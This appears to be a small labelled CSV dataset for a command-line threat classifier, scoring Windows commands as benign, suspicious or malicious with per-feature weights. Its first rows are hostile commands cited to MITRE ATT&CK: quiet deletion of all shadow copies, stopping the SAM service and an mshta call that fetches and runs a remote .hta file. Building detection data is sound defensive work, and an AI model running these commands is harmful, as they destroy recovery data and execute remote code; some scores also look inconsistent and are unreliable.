prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label
Cmd /k start chrome https://onedrive.live.com/embed?cid=880174EF88F116A9,Adversaries can spawn chrome.exe to download malicious files on the target system.,cmd,none,none,https://onedrive.live.com/embed?cid=880174EF88F116A9,none,Cmd /k start,Mitre Attack,0.3,suspicious
Vssadmin.exe delete shadows /all /quiet,Adversaries may use vssadmin.exe to delete volume shadow copies to prevent system recovery.,vssadmin.exe,none,none,none,none,delete shadows /all /quiet,Mitre Attack,0.2,suspicious
C:\Windows\system32\net.exe stop “samss” /y,Adversaries can use net.exe to stop services on the target system.,net.exe,"/y, samss",none,none,none,stop ,Mitre Attack,0.6,malicious
Mshta https://median-researchers.000webhostapp.com/cmd.hta,Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript.,mshta,hta,none,https://median-researchers.000webhostapp.com,https://median-researchers.000webhostapp.com,cmd.hta,Mitre Attack,0.8,malicious
dir,list files,none,none,none,none,none,none,none,0,benign
dir /a /s,"List all files (including hidden/system), recursively",none,none,none,none,none,/a /s,none,0.1,benign
ping google.com,Test internet connectivity,none,none,none,none,google.com,none,none,0.1,benign
ping 172.20.3.2,Test network connectivity,none,none,none,none,172.20.3.2,none,none,0.1,benign
arp -a,View ARP cache,none,none,none,none,none,arp -a,none,0.1,benign
net share,List shared folders,none,none,none,none,none,net share,none,0.1,benign
tracert google.com,Trace route to a host,none,none,none,none,google.com,tracert,none,0.2,benign
net view \\hostname,View shared resources on a host,none,none,none,none,none,view \\hostname,none,0.1,benign
cls,clear screen,none,none,none,none,none,cls,none,0.1,benign
logoff,Log off current session,none,none,none,none,none,logoff,none,0.1,benign
whoami /groups,Show user and group memberships,none,none,none,none,none,whoami /groups,none,0.1,benign
set,Show environment variables,none,none,none,none,none,set,none,0.1,benign
ren oldname.txt newname.txt,rename file,none,none,none,none,none,ren,none,0.1,benign
mkdir C:\Logs\2025,Create a folder,none,none,none,C:\Logs\2025,none,mkdir,none,0.2,benign
hostname,Get computer name,none,none,none,none,none,hostname,none,0.1,benign
systeminfo,Full system info,none,none,none,none,none,systeminfo,none,0.1,benign
ipconfig /all,Full network configuration,none,none,none,none,none,ipconfig /all,none,0.1,benign
tasklist /v,Detailed running process,none,none,none,none,none,tasklist /v,none,0.1,benign
shutdown /r /f /t 60,Restart computer after 60 seconds,none,none,none,none,none,shutdown /r /f /t 60,none,0.1,benign
